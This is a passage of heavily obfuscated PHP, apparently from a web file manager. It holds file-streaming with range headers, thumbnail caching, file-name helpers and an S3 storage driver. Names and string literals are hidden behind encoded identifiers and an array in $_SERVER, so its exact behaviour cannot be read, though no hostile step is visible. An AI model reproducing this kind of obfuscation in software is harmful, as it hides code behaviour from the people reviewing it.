(isset($_SERVER[$†ï‘Ÿøı[132]]) && strtotime($_SERVER[$†ï‘Ÿøı[132]]) == $¨×µâÕı[$†ï‘Ÿøı[85]]) { header($†ï‘Ÿøı[133], !0, 304); die; } if (isset($_SERVER[$†ï‘Ÿøı[134]]) && $_SERVER[$†ï‘Ÿøı[134]] == $¥ô×¡) { header($†ï‘Ÿøı[135] . $¥ô×¡, !0, 304); die; } header($†ï‘Ÿøı[135] . $¥ô×¡); header($†ï‘Ÿøı[136] . $Ñ‚¬ˆë . $†ï‘Ÿøı[128]); header($†ï‘Ÿøı[137] . $ŞÅãçÊ‡); header($†ï‘Ÿøı[138]); header($†ï‘Ÿøı[139] . $¿õË¯¨›); header($†ï‘Ÿøı[140]); if (!$»òº¿µ³ && $æâè³ãè == $†ï‘Ÿøı[141]) { if ($¿õË¯¨› > 1024 * 1024 * 5) { die; } $ˆê‹˜ü = $this->getContent($óş³·Ÿˆ); $ˆê‹˜ü = Html::clearSVG($ˆê‹˜ü); header($†ï‘Ÿøı[142] . strlen($ˆê‹˜ü)); echo $ˆê‹˜ü; die; } $Šõ¹˜œß = strtolower($_SERVER[$†ï‘Ÿøı[143]]); if ($Úí˜ÑĞ && $Šõ¹˜œß && $Ã«¿œ“ğ) { if (strstr($Šõ¹˜œß, $†ï‘Ÿøı[144])) { header($†ï‘Ÿøı[145] . $óş³·Ÿˆ); } else { if (strstr($Šõ¹˜œß, $†ï‘Ÿøı[146])) { header($†ï‘Ÿøı[147] . $óş³·Ÿˆ); } else { if (strstr($Šõ¹˜œß, $†ï‘Ÿøı[148])) { header($†ï‘Ÿøı[149] . $óş³·Ÿˆ); } } } if ($×É‡í¨ß) { header($†ï‘Ÿøı[150] . $×É‡í¨ß); } return; } if (isset($_SERVER[$†ï‘Ÿøı[151]])) { if (preg_match($†ï‘Ÿøı[152], $_SERVER[$†ï‘Ÿøı[151]], $‘Öá¢ßÅ)) { $³–èù˜… = intval($‘Öá¢ßÅ[1]); if (!empty($‘Öá¢ßÅ[2])) { $¶ˆñ¶ = intval($‘Öá¢ßÅ[2]); } } header($†ï‘Ÿøı[153]); header("\103\x6f\156\x74\x65\156\164\55\x52\x61\156\x67\145\x3a\x20\x62\171\x74\x65\x73\x20{$³–èù˜…}\x2d{$¶ˆñ¶}\57" . $¿õË¯¨›); } else { header($†ï‘Ÿøı[154]); } header($†ï‘Ÿøı[155]); $÷’Ÿ¸ßÔ = !0; if ($_SERVER[$†ï‘Ÿøı[156]] == $†ï‘Ÿøı[157] && $¿õË¯¨› > 1204 * 1024 * 1024 * 2) { $÷’Ÿ¸ßÔ = !1; } if ($÷’Ÿ¸ßÔ) { header($†ï‘Ÿøı[158] . ($¶ˆñ¶ - $³–èù˜… + 1)); } if ($_SERVER[$†ï‘Ÿøı[159]] == $†ï‘Ÿøı[160]) { return; } $»Ôƒ‰ğ = 1024 * 100; $åçï¯¢Ø = 0; if ($×É‡í¨ß) { $åçï¯¢Ø = intval(1000 * 1000 * ($»Ôƒ‰ğ / $×É‡í¨ß)); } while ($³–èù˜… <= $¶ˆñ¶) { $¯½©ƒö = timeFloat(); check_abort(); $øİúó®ã = $¶ˆñ¶ - $³–èù˜… + 1; if ($øİúó®ã <= $»Ôƒ‰ğ) { $»Ôƒ‰ğ = $øİúó®ã; } echo $this->fileSubstr($óş³·Ÿˆ, $³–èù˜…, $»Ôƒ‰ğ); $³–èù˜… += $»Ôƒ‰ğ; if ($»Ôƒ‰ğ == $øİúó®ã) { $³–èù˜… = $¶ˆñ¶ + 1; } if ($åçï¯¢Ø) { $Àºéâ†á = intval(1000 * 1000 * (timeFloat() - $¯½©ƒö)); $Ü¨˜Ş¸Â = $åçï¯¢Ø - $Àºéâ†á; if ($Ü¨˜Ş¸Â > 5) { usleep($Ü¨˜Ş¸Â); } } } } public function fileOutServer($áäÌÓÙ¤, $ò×¨Öü÷ = false, $Á™¹ƒœÅ = false, $­ÉéÑ‘ = '') { $this->fileOut($áäÌÓÙ¤, $ò×¨Öü÷, $Á™¹ƒœÅ, $­ÉéÑ‘); } public function fileOutLink($¥È×İ€) { header($_SERVER[ñˆ‹ß¿÷][161] . $¥È×İ€); die; } public function cacheMethod($¶°ã±Áõ, $ÈâãÛ»à, $ƒºß²Ã¼ = null) { $êá¤®îğ =& $_SERVER[ñˆ‹ß¿÷]; static $·Üñî˜¾ = array(); $Â¶§½ƒı = $ÈâãÛ»à ? ltrim($this->getPathOuter($ÈâãÛ»à), $êá¤®îğ[8]) : $êá¤®îğ[12]; $Şş»Œô« = $êá¤®îğ[162] . $¶°ã±Áõ . $êá¤®îğ[163] . rtrim($Â¶§½ƒı, $êá¤®îğ[8]); if (is_null($¶°ã±Áõ)) { $·Üñî˜¾ = array(); return; } if (is_null($ÈâãÛ»à)) { foreach ($·Üñî˜¾ as $Şş»Œô« => $«½å«…¬) { if (!strstr($Şş»Œô«, $êá¤®îğ[162] . $¶°ã±Áõ . $êá¤®îğ[164])) { continue; } unset($·Üñî˜¾[$Şş»Œô«]); } return; } if (!is_null($ƒºß²Ã¼)) { $·Üñî˜¾[$Şş»Œô«] = $ƒºß²Ã¼; return; } $èÀ¨˜€® = isset($·Üñî˜¾[$Şş»Œô«]) ? $·Üñî˜¾[$Şş»Œô«] : null; if (!is_null($èÀ¨˜€®)) { return $èÀ¨˜€®; } $èÀ¨˜€® = $this->{$¶°ã±Áõ}($ÈâãÛ»à); $·Üñî˜¾[$Şş»Œô«] = $èÀ¨˜€®; return $èÀ¨˜€®; } public function cacheMethodInfoSet($ò‰§’„», $Íş™²ÅÕ, $ô¶¬ å• = false) { $ÆÜ²ßÔÕ =& $_SERVER[ñˆ‹ß¿÷]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ÆÜ²ßÔÕ[165], $ò‰§’„», $Íş™²ÅÕ); $this->cacheMethod($ÆÜ²ßÔÕ[166], $ò‰§’„», $Íş™²ÅÕ ? !1 : !0); if (is_array($ô¶¬ å•)) { $this->cacheMethod($ÆÜ²ßÔÕ[167], $ò‰§’„», $ô¶¬ å•); } } public function fileOutImage($½µôÌ¨, $æÆØ—³Ÿ = 250) { $Å¢îÇ×° =& $_SERVER[ñˆ‹ß¿÷]; set_timeout(); if (substr($½µôÌ¨, 0, 4) == $Å¢îÇ×°[148]) { $this->fileOutLink($½µôÌ¨); } $¦öŒÎ¸ä = $this->info($½µôÌ¨); $°ØÉŸö¶ = $¦öŒÎ¸ä[$Å¢îÇ×°[32]]; $±ÂÓ‰û® = !1; if (isset($GLOBALS[$Å¢îÇ×°[168]]) && $GLOBALS[$Å¢îÇ×°[168]][$Å¢îÇ×°[84]] == $¦öŒÎ¸ä[$Å¢îÇ×°[84]]) { $ÕèÙùĞï = $GLOBALS[$Å¢îÇ×°[168]][$Å¢îÇ×°[169]]; if (!$¦öŒÎ¸ä[$Å¢îÇ×°[170]]) { $¦öŒÎ¸ä[$Å¢îÇ×°[170]] = $GLOBALS[$Å¢îÇ×°[168]]; } if (isset($ÕèÙùĞï[$Å¢îÇ×°[171]])) { if ($ÕèÙùĞï[$Å¢îÇ×°[171]] <= $æÆØ—³Ÿ && $ÕèÙùĞï[$Å¢îÇ×°[172]] <= $æÆØ—³Ÿ) { $±ÂÓ‰û® = !0; } } $°ØÉŸö¶ = $¦öŒÎ¸ä[$Å¢îÇ×°[170]][$Å¢îÇ×°[32]]; } if ($¦öŒÎ¸ä[$Å¢îÇ×°[76]] <= 1024 * 50 || $±ÂÓ‰û® || !function_exists($Å¢îÇ×°[173]) || $¦öŒÎ¸ä[$Å¢îÇ×°[174]] == $Å¢îÇ×°[175]) { return $this->fileOut($½µôÌ¨, !1, $°ØÉŸö¶); } if (isset($¦öŒÎ¸ä[$Å¢îÇ×°[170]][$Å¢îÇ×°[176]])) { $æ‡áë´ = $¦öŒÎ¸ä[$Å¢îÇ×°[170]][$Å¢îÇ×°[176]]; } else { if (isset($¦öŒÎ¸ä[$Å¢îÇ×°[170]][$Å¢îÇ×°[177]])) { $æ‡áë´ = $¦öŒÎ¸ä[$Å¢îÇ×°[170]][$Å¢îÇ×°[177]]; } } if (!$æ‡áë´) { $æ‡áë´ = md5("{$¦öŒÎ¸ä[$Å¢îÇ×°[32]]}\x5f{$¦öŒÎ¸ä[$Å¢îÇ×°[84]]}\x5f{$¦öŒÎ¸ä[$Å¢îÇ×°[76]]}\137{$æÆØ—³Ÿ}"); } $õ°ïé‘¹ = "{$æ‡áë´}\137{$æÆØ—³Ÿ}\56\160\156\x67"; if (!($¸ ªèìú = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $Å¢îÇ×°[178]))) { $ä…È×ŸÁ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $Å¢îÇ×°[179]); } else { $ä…È×ŸÁ = KodIO::make($¸ ªèìú); } if ($¸ ªèìú = IO::fileNameExist($ä…È×ŸÁ, $õ°ïé‘¹)) { $÷Š›ÉÆ = KodIO::make($¸ ªèìú); return IO::fileOut($÷Š›ÉÆ, !1, $°ØÉŸö¶); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $÷Š›ÉÆ = DATA_THUMB . $õ°ïé‘¹; del_file($÷Š›ÉÆ); if (!@file_exists($÷Š›ÉÆ)) { $àÂ¬™® = TEMP_FILES; if (!is_dir($àÂ¬™®)) { mk_dir($àÂ¬™®); } $ªÄó´€« = $àÂ¬™® . $æ‡áë´ . $Å¢îÇ×°[10] . $¦öŒÎ¸ä[$Å¢îÇ×°[174]]; if (!@file_exists($ªÄó´€«)) { $ªÄó´€« = $this->download($½µôÌ¨, $ªÄó´€«); } ImageThumb::createThumb($ªÄó´€«, $÷Š›ÉÆ, $æÆØ—³Ÿ, $æÆØ—³Ÿ * 10); } if (!file_exists($÷Š›ÉÆ) || filesize($÷Š›ÉÆ) < 100) { return @file_exists($ªÄó´€«) ? IO::fileOut($ªÄó´€«) : $this->fileOut($½µôÌ¨); } if (!($ßŸ–ªÀı = IO::move($÷Š›ÉÆ, $ä…È×ŸÁ))) { return IO::fileOut($÷Š›ÉÆ); } del_file($÷Š›ÉÆ); IO::fileOut($ßŸ–ªÀı); } public function fileOutImageServer($ºåùÅåÈ, $€èÒÀŸá = 250) { $this->fileOutImage($ºåùÅåÈ, $€èÒÀŸá); } public function fileNameAuto($ÄâÛ£­ˆ, $‡­ì²Ì«, $ä¥¸Ÿî = REPEAT_RENAME, $ıèæ‹‰ß = false) { $¢²¬Ù =& $_SERVER[ñˆ‹ß¿÷]; $È‡Îí§¸ = $ÄâÛ£­ˆ === $¢²¬Ù[12] ? $‡­ì²Ì« : rtrim($ÄâÛ£­ˆ, $¢²¬Ù[8]) . $¢²¬Ù[8] . $‡­ì²Ì«; if ($ä¥¸Ÿî == REPEAT_REPLACE || !$this->exist($È‡Îí§¸) || $ıèæ‹‰ß && $ä¥¸Ÿî != REPEAT_RENAME_FOLDER) { return $‡­ì²Ì«; } if ($ä¥¸Ÿî == REPEAT_SKIP) { return !1; } $ış±Ï = $¢²¬Ù[10] . get_path_ext($‡­ì²Ì«); $ış±Ï = $ış±Ï == $¢²¬Ù[10] || $ıèæ‹‰ß ? $¢²¬Ù[12] : $ış±Ï; $©ÈÊÕ¤æ = 1; $Æª‚Ù½ğ = substr($‡­ì²Ì«, 0, strlen($‡­ì²Ì«) - strlen($ış±Ï)); $‚âÕÌ‘˜ = $Æª‚Ù½ğ . "\50{$©ÈÊÕ¤æ}\x29{$ış±Ï}"; while ($this->exist(rtrim($ÄâÛ£­ˆ, $¢²¬Ù[8]) . $¢²¬Ù[8] . $‚âÕÌ‘˜)) { $‚âÕÌ‘˜ = $Æª‚Ù½ğ . "\x28{$©ÈÊÕ¤æ}\x29{$ış±Ï}"; $©ÈÊÕ¤æ++; } return $‚âÕÌ‘˜; } private function fileNameAutoList($ê†ë•Ûš, $ÛØõ½·ñ, $˜Üù‘± = false) { $£šëæ§ğ =& $_SERVER[ñˆ‹ß¿÷]; $ñÓ¼–Í = $this->listPath($ê†ë•Ûš, !0); $ñÓ¼–Í = array_merge($ñÓ¼–Í[$£šëæ§ğ[82]], $ñÓ¼–Í[$£šëæ§ğ[83]]); $û«ÒØïŞ = array_to_keyvalue($ñÓ¼–Í, $£šëæ§ğ[12], $£šëæ§ğ[32]); $¬áşÈ–÷ = $£šëæ§ğ[10] . get_path_ext($ÛØõ½·ñ); $¬áşÈ–÷ = $¬áşÈ–÷ == $£šëæ§ğ[10] || $˜Üù‘± ? $£šëæ§ğ[12] : $¬áşÈ–÷; $¤Ñ¯ÀËÅ = substr($ÛØõ½·ñ, 0, strlen($ÛØõ½·ñ) - strlen($¬áşÈ–÷)); $ÓÀõÈ¿Ü = $¤Ñ¯ÀËÅ . "\x28\x30\x29{$¬áşÈ–÷}"; for ($˜Ñº’ö¡ = 1; $˜Ñº’ö¡ <= count($û«ÒØïŞ) + 1; $˜Ñº’ö¡++) { $ÓÀõÈ¿Ü = $¤Ñ¯ÀËÅ . "\50{$˜Ñº’ö¡}\51{$¬áşÈ–÷}"; if (!in_array_not_case($ÓÀõÈ¿Ü, $û«ÒØïŞ)) { return $ÓÀõÈ¿Ü; } } return $ÓÀõÈ¿Ü; } public function listAllFiles($±³¶º›, $˜éÔÖ˜, $ÒÎ¼ù–£ = array()) { $Ù•ùİ¤ =& $_SERVER[ñˆ‹ß¿÷]; if (empty($˜éÔÖ˜)) { return array(); } $ÅÇºÑ‰¬ = array(); $±³¶º› = trim($±³¶º›, $Ù•ùİ¤[8]); foreach ($˜éÔÖ˜ as $©õùÖŞ) { $¯ŒÓ¯ÒÙ = ltrim(substr(trim($©õùÖŞ, $Ù•ùİ¤[8]), strlen($±³¶º›)), $Ù•ùİ¤[8]); $ÅÇºÑ‰¬ = array_merge($ÅÇºÑ‰¬, $this->slicePath($¯ŒÓ¯ÒÙ)); } $³ŒÔŠğ… = array(); foreach (array_unique($ÅÇºÑ‰¬) as $©õùÖŞ) { $ø×²‚¨° = array($Ù•ùİ¤[84] => $this->getPathOuter($Ù•ùİ¤[8] . $±³¶º› . $Ù•ùİ¤[8] . $©õùÖŞ), $Ù•ùİ¤[75] => 1, $Ù•ùİ¤[76] => 0); if (substr($©õùÖŞ, -1) != $Ù•ùİ¤[8]) { $ø×²‚¨°[$Ù•ùİ¤[75]] = 0; $‚ÂÑ†íğ = $this->getPath($±³¶º› . $Ù•ùİ¤[8] . $©õùÖŞ); $ø×²‚¨°[$Ù•ùİ¤[76]] = isset($ÒÎ¼ù–£[$‚ÂÑ†íğ]) ? $ÒÎ¼ù–£[$‚ÂÑ†íğ] : $this->size($‚ÂÑ†íğ); } $³ŒÔŠğ…[] = $ø×²‚¨°; } return $³ŒÔŠğ…; } public function slicePath($ËÑåƒ‘Ÿ) { $Ü·î°Ì™ =& $_SERVER[ñˆ‹ß¿÷]; $¶Áó´ó = explode($Ü·î°Ì™[8], trim($ËÑåƒ‘Ÿ, $Ü·î°Ì™[8])); $â—®Å¸ = 0; do { ++$â—®Å¸; $şÜ¬ùÂ€[] = implode($Ü·î°Ì™[8], array_slice($¶Áó´ó, 0, $â—®Å¸)) . $Ü·î°Ì™[8]; } while ($â—®Å¸ < count($¶Áó´ó)); $şÜ¬ùÂ€[count($¶Áó´ó) - 1] = $ËÑåƒ‘Ÿ; return $şÜ¬ùÂ€; } public function getHost() { $˜ÄÂ¯Åş =& $_SERVER[ñˆ‹ß¿÷]; $Ï¸”åğª = parse_url(trim($this->domain, $˜ÄÂ¯Åş[8])); $ÎöçÃÑÅ = isset($Ï¸”åğª[$˜ÄÂ¯Åş[180]]) ? $Ï¸”åğª[$˜ÄÂ¯Åş[180]] : http_type(); $øÂİÃÔ˜ = isset($Ï¸”åğª[$˜ÄÂ¯Åş[181]]) ? $Ï¸”åğª[$˜ÄÂ¯Åş[181]] : $Ï¸”åğª[$˜ÄÂ¯Åş[84]]; if (isset($Ï¸”åğª[$˜ÄÂ¯Åş[182]])) { $øÂİÃÔ˜ .= $˜ÄÂ¯Åş[4] . $Ï¸”åğª[$˜ÄÂ¯Åş[182]]; } return $ÎöçÃÑÅ . $˜ÄÂ¯Åş[183] . $øÂİÃÔ˜; } public function pathEncode($“ÙÃçõÈ) { $¸ ‹úä¥ =& $_SERVER[ñˆ‹ß¿÷]; return str_replace($¸ ‹úä¥[184], $¸ ‹úä¥[8], rawurlencode($“ÙÃçõÈ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($šíöÜÖ) { set_timeout(); require_once SDK_DIR . $_SERVER[ñˆ‹ß¿÷][185]; parent::__construct(); $this->_init($šíöÜÖ); } public function _init($œé˜ª³à) { foreach ($œé˜ª³à as $İá››É => $äŞœ®î™) { if (isset($this->{$İá››É})) { $this->{$İá››É} = $äŞœ®î™; } } $this->endpoint = $œé˜ª³à[$_SERVER[ñˆ‹ß¿÷][186]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($Ò¡£ë² = "\x76\x34") { $this->signVer = $Ò¡£ë²; $this->client->setSignatureVersion($Ò¡£ë²); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $Ÿ·ì¶ŒÍ =& $_SERVER[ñˆ‹ß¿÷]; $•ş³Êñ¶ = $this->getBucketCors(); if (!$•ş³Êñ¶ || !is_array($•ş³Êñ¶)) { return !1; } if ($•ş³Êñ¶[$Ÿ·ì¶ŒÍ[187]] != $Ÿ·ì¶ŒÍ[188] || $•ş³Êñ¶[$Ÿ·ì¶ŒÍ[189]] != $Ÿ·ì¶ŒÍ[188]) { return !1; } $¶¸¸Şæ¬ = array_map($Ÿ·ì¶ŒÍ[190], $•ş³Êñ¶[$Ÿ·ì¶ŒÍ[191]]); if (!is_array($¶¸¸Şæ¬)) { $¶¸¸Şæ¬ = array(); } $•ƒ¥–º = array($Ÿ·ì¶ŒÍ[192], $Ÿ·ì¶ŒÍ[193], $Ÿ·ì¶ŒÍ[194], $Ÿ·ì¶ŒÍ[195], $Ÿ·ì¶ŒÍ[196]); $¼‡òû²Œ = array_diff($•ƒ¥–º, $¶¸¸Şæ¬); return empty($¼‡òû²Œ); } public function mkfile($ ô¸û, $µ•³É¹ = '', $¢­óƒ¢  = REPEAT_RENAME) { $˜éøÀÁ = $this->setContent($ ô¸û, $µ•³É¹); if ($˜éøÀÁ !== !1) { return $this->getPathOuter($ ô¸û); } return !1; } public function mkdir($…Í„¼÷È, $œÄƒ„Ü¯ = REPEAT_SKIP) { $Ùì·¢Ôœ =& $_SERVER[ñˆ‹ß¿÷]; if (empty($…Í„¼÷È) && $…Í„¼÷È !== $Ùì·¢Ôœ[197]) { return !1; } if ($œÄƒ„Ü¯ && $this->_isFolder($…Í„¼÷È)) { return $this->getPathOuter($…Í„¼÷È); } $¼‡ûïÔ = $this->setContent($…Í„¼÷È, $Ùì·¢Ôœ[12], !0); if ($¼‡ûïÔ !== !1) { return $this->getPathOuter($…Í„¼÷È); } return !1; } public function copyFile($€ª§¸»‚, $ºšÏ›Ù¸, $â†ƒ„À£ = array()) { $­¥‹Œ =& $_SERVER[ñˆ‹ß¿÷]; $™ŞŸæËª = $this->objectMeta($€ª§¸»‚); if (!$™ŞŸæËª) { return !1; } if ($™ŞŸæËª[$­¥‹Œ[76]] <= 1024 * 1024 * 200) { $û¡Ü®Î = $this->client->copyObject($this->bucket, $€ª§¸»‚, $this->bucket, $ºšÏ›Ù¸, $­¥‹Œ[198], $â†ƒ„À£); } else { $û¡Ü®Î = $this->client->multiCopyObject($this->bucket, $€ª§¸»‚, $this->bucket, $ºšÏ›Ù¸, $â†ƒ„À£); } $û¡Ü®Î = $û¡Ü®Î ? $this->getPathOuter($ºšÏ›Ù¸) : !1; return $û¡Ü®Î; } public function moveFile($Ù¼¤¡Â½, $ëç‘åÌ†) { if ($this->copyFile($Ù¼¤¡Â½, $ëç‘åÌ†)) { $this->delFile($Ù¼¤¡Â½); return $this->getPathOuter($ëç‘åÌ†); } return !1; } public function delFile($”´¶ÔÊ) { return $this->client->deleteObject($this->bucket, $”´¶ÔÊ); } public function delFolder($Ë·Ùö™ñ) { $ïÕ°–÷ =& $_SERVER[ñˆ‹ß¿÷]; if (!$this->exist($Ë·Ùö™ñ)) { return !0; } $this->listItemCache = !1; $ÄËÌåùÈ = $this->fileList($Ë·Ùö™ñ); $this->listItemCache = !0; $÷§‘Ş™ = trim($Ë·Ùö™ñ, $ïÕ°–÷[8]) . $ïÕ°–÷[8]; if (!empty($Ë·Ùö™ñ) && $Ë·Ùö™ñ !== $ïÕ°–÷[197] && !in_array($÷§‘Ş™, $ÄËÌåùÈ[$ïÕ°–÷[82]])) { $ÄËÌåùÈ[$ïÕ°–÷[82]][] = $÷§‘Ş™; } $¹ù·¦Ì› = $this->delByBatch($ÄËÌåùÈ[$ïÕ°–÷[83]]); if (!$¹ù·¦Ì›) { return !1; } $¹ù·¦Ì› = $this->delByBatch($ÄËÌåùÈ[$ïÕ°–÷[82]]); if (!$¹ù·¦Ì›) { return !1; } return $this->delFile($÷§‘Ş™); } private function delByBatch($á¤¿ûÜ ) { foreach (array_chunk($á¤¿ûÜ , 1000) as $ÏĞ¤×Ï²) { $´÷Ù¦ã€ = $this->client->deleteObjects($this->bucket, $ÏĞ¤×Ï²); if (!$´÷Ù¦ã€) { return !1; } } return !0; } public function rename($«÷î…İ, $¬ĞÇ†Ä«) { return $this->renameObject($«÷î…İ, $¬ĞÇ†Ä«); } public function listPath($ø„ÇæÄÛ, $ ¯Ğ–˜´ = false) { $Â°»ß• =& $_SERVER[ñˆ‹ß¿÷]; $©¹Æë‰ = $this->fileList($ø„ÇæÄÛ, $Â°»ß•[8], !0); foreach ($©¹Æë‰[$Â°»ß•[82]] as $Ì³Ù±Ò© => $¡÷ü»Ä›) { $©¹Æë‰[$Â°»ß•[82]][$Ì³Ù±Ò©] = $this->folderInfo($¡÷ü»Ä›, $ ¯Ğ–˜´, $¡÷ü»Ä›); } foreach ($©¹Æë‰[$Â°»ß•[83]] as $Ì³Ù±Ò© => $¡÷ü»Ä›) { $©¹Æë‰[$Â°»ß•[83]][$Ì³Ù±Ò©] = $this->fileInfo($¡÷ü»Ä›[$Â°»ß•[32]], $ ¯Ğ–˜´, $¡÷ü»Ä›); } return $©¹Æë‰; } protected function infoChildren($ùÌæÖÕ¼, &$¾»å©Ö‰) { $‘ü™¯¶æ =& $_SERVER[ñˆ‹ß¿÷]; $æÎ¸Ÿå© = $this->fileList($ùÌæÖÕ¼, $‘ü™¯¶æ[12], !0); $¾»å©Ö‰[$‘ü™¯¶æ[78]] += count($æÎ¸Ÿå©[$‘ü™¯¶æ[82]]); $¾»å©Ö‰[$‘ü™¯¶æ[77]] += count($æÎ¸Ÿå©[$‘ü™¯¶æ[83]]); foreach ($æÎ¸Ÿå©[$‘ü™¯¶æ[83]] as $ê¨úı¬†) { if (!$ê¨úı¬† || !$ê¨úı¬†[$‘ü™¯¶æ[76]]) { continue; } $¾»å©Ö‰[$‘ü™¯¶æ[76]] += $ê¨úı¬†[$‘ü™¯¶æ[76]]; } } private function fileInfo($¬¦ˆî§ë, $£Õ×§Öô = false, $Ü¶‚ÓÕ° = array()) { $µºèöé› =& $_SERVER[ñˆ‹ß¿÷]; $ÂÏ¢™¢„ = array($µºèöé›[32] => $this->pathThis($¬¦ˆî§ë), $µºèöé›[84] => $this->getPathOuter($¬¦ˆî§ë), $µºèöé›[33] => $µºèöé›[199], $µºèöé›[174] => $this->ext($¬¦ˆî§ë), $µºèöé›[76] => isset($Ü¶‚ÓÕ°[$µºèöé›[76]]) ? $Ü¶‚ÓÕ°[$µºèöé›[76]] : 0); if ($£Õ×§Öô) { return $ÂÏ¢™¢„; } $ÂÏ¢™¢„[$µºèöé›[200]] = $ÂÏ¢™¢„[$µºèöé›[85]] = 0; $ÂÏ¢™¢„[$µºèöé›[201]] = $ÂÏ¢™¢„[$µºèöé›[202]] = !0; if (empty($Ü¶‚ÓÕ°)) { $Ü¶‚ÓÕ° = $this->objectMeta($¬¦ˆî§ë); if (!$Ü¶‚ÓÕ°) { return $ÂÏ¢™¢„; } } if (isset($Ü¶‚ÓÕ°[$µºèöé›[203]])) { $ÂÏ¢™¢„[$µºèöé›[85]] = $Ü¶‚ÓÕ°[$µºèöé›[203]]; } if (isset($Ü¶‚ÓÕ°[$µºèöé›[76]])) { $ÂÏ¢™¢„[$µºèöé›[76]] = $Ü¶‚ÓÕ°[$µºèöé›[76]]; } return $ÂÏ¢™¢„; } private function folderInfo($ëë“Â‡, $ìĞ¯ç = false, $°Ğ·İ£ = array()) { $’µä—îò =& $_SERVER[ñˆ‹ß¿÷]; $Ìı¥Ûü = array($’µä—îò[32] => $this->pathThis($ëë“Â‡), $’µä—îò[84] => $this->getPathOuter($’µä—îò[8] . $ëë“Â‡), $’µä—îò[33] => $’µä—îò[75]); if ($ìĞ¯ç) { return $Ìı¥Ûü; } $Ìı¥Ûü[$’µä—îò[200]] = $Ìı¥Ûü[$’µä—îò[85]] = 0; $Ìı¥Ûü[$’µä—îò[201]] = $Ìı¥Ûü[$’µä—îò[202]] = !0; if ($ëë“Â‡ == $’µä—îò[12]) { return $Ìı¥Ûü; } if (empty($°Ğ·İ£)) { $°Ğ·İ£ = $this->objectMeta(trim($ëë“Â‡, $’µä—îò[8]) . $’µä—îò[8]); } if (isset($°Ğ·İ£[$’µä—îò[203]])) { $Ìı¥Ûü[$’µä—îò[200]] = $°Ğ·İ£[$’µä—îò[203]]; } return $Ìı¥Ûü; } private function fileList($ÚñÌü¬, $¹™ªâ” = '', $¶ºş½Å¨ = 0) { $’â‰¸ô =& $_SERVER[ñˆ‹ß¿÷]; $Ö‚Ü§±ó = rtrim($ÚñÌü¬, $’â‰¸ô[8]) . $’â‰¸ô[8]; $Èïáµ×À = $this->listObjs($Ö‚Ü§±ó, null, null, $¹™ªâ”); if (!$Èïáµ×À) { return array($’â‰¸ô[82] => array(), $’â‰¸ô[83] => array()); } $ñıé•â† = $ÇÆÅ¸›á = array(); foreach ($Èïáµ×À[$’â‰¸ô[204]] as $´·®“‘è) { $éç÷¬‚ê = $´·®“‘è[$’â‰¸ô[32]]; if ($éç÷¬‚ê == $Ö‚Ü§±ó) { continue; } $“ü¬Ëƒè = isset($´·®“‘è[$’â‰¸ô[76]]) ? $´·®“‘è[$’â‰¸ô[76]] : 0; $îÑù Ç¥ = $“ü¬Ëƒè == 0 && substr($éç÷¬‚ê, strlen($éç÷¬‚ê) - 1, 1) == $’â‰¸ô[8] ? !0 : !1; $this->cacheMethodInfoSet($éç÷¬‚ê, $îÑù Ç¥, $´·®“‘è); if ($îÑù Ç¥) { $ñıé•â†[] = $éç÷¬‚ê; continue; } $ÇÆÅ¸›á[] = $¶ºş½Å¨ ? $´·®“‘è : $éç÷¬‚ê; } foreach ($Èïáµ×À[$’â‰¸ô[205]] as $´·®“‘è) { $ñıé•â†[] = $´·®“‘è[$’â‰¸ô[32]]; $this->cacheMethodInfoSet($´·®“‘è[$’â‰¸ô[32]], !0); } $this->cacheMethodInfoSet($ÚñÌü¬, !0); return array($’â‰¸ô[82] => $ñıé•â†, $’â‰¸ô[83] => $ÇÆÅ¸›á); } private function listObjs($øÚÂî, $˜ëİ—‡² = null, $³Í•¶³¡ = null, $¹·ƒé˜ç = null) { $Ş¹Äãîµ =& $_SERVER[ñˆ‹ß¿÷]; $øÚÂî = trim($øÚÂî, $Ş¹Äãîµ[8]); $±íÂ¢œ‘ = empty($øÚÂî) && $øÚÂî !== $Ş¹Äãîµ[197] ? $Ş¹Äãîµ[12] : $øÚÂî . $Ş¹Äãîµ[8]; return $this->client->getBucket($this->bucket, $±íÂ¢œ‘, $˜ëİ—‡², $³Í•¶³¡, $¹·ƒé˜ç, !0); } public function has($ÀØÛ, $şöÜıÎä = false, $Ëù€Ÿ‚ = true) { $”ôË¬Çü =& $_SERVER[ñˆ‹ß¿÷]; $ÀØÛ = trim($ÀØÛ, $”ôË¬Çü[8]); $›ˆ¬—şé = empty($ÀØÛ) && $ÀØÛ !== $”ôË¬Çü[197] ? $”ôË¬Çü[12] : $ÀØÛ . $”ôË¬Çü[8]; $›óÙõ€ = null; $“ ­òá = 500; $¯í·”Ì = $”ôË¬Çü[8]; $©ş©¨—Ñ = $£Û¤ÉÖ« = array(); while (!0) { $Şòíó‹– = $this->listObjs($ÀØÛ, $›óÙõ€, $“ ­òá, $¯í·”Ì); if (!$Şòíó‹–) { break; } $›óÙõ€ = $Şòíó‹–[$”ôË¬Çü[206]]; $€ÚÓŠä× = $Şòíó‹–[$”ôË¬Çü[204]]; $Í³Ó¬şŸ = $Şòíó‹–[$”ôË¬Çü[205]]; if (empty($€ÚÓŠä×) && empty($Í³Ó¬şŸ)) { break; } if (count($€ÚÓŠä×) == 1 && $€ÚÓŠä×[0][$”ôË¬Çü[32]] == $›ˆ¬—şé) { break; } if ($şöÜıÎä) { if (count($€ÚÓŠä×)) { $€ÚÓŠä× = array_column($€ÚÓŠä×, $”ôË¬Çü[32]); $©ş©¨—Ñ = array_merge($©ş©¨—Ñ, $€ÚÓŠä×); } if (count($Í³Ó¬şŸ)) { $Í³Ó¬şŸ = array_column($Í³Ó¬şŸ, $”ôË¬Çü[32]); $£Û¤ÉÖ« = array_merge($£Û¤ÉÖ«, $Í³Ó¬şŸ); } if ($›óÙõ€ === null) { break; } continue; } if 